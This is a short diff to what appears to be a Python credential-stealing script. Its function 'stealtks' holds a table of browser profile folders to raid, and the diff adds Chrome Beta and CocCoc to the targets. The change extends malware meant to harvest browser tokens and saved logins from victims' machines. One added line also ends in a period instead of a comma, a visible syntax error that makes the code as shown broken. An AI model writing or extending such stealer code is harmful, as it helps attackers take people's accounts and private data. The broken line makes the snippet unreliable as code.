@@ -262,6 +262,7 @@ def stealtks():
     '0Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
     '0ChromeSxS': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
     '0Comet': os.path.join(local, 'Comet', 'User Data'),
+    '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data').
     '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
     '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
     '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
@@ -271,6 +272,7 @@ def stealtks():
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
+    '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
     '0Hola': os.path.join(appdata, 'Hola', 'chromium_profile'),
     '0Iridium': os.path.join(local, "Iridium", "User Data"),
     '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
@@ -400,6 +402,7 @@ def main():
         
 
 main()
+
 
 
 
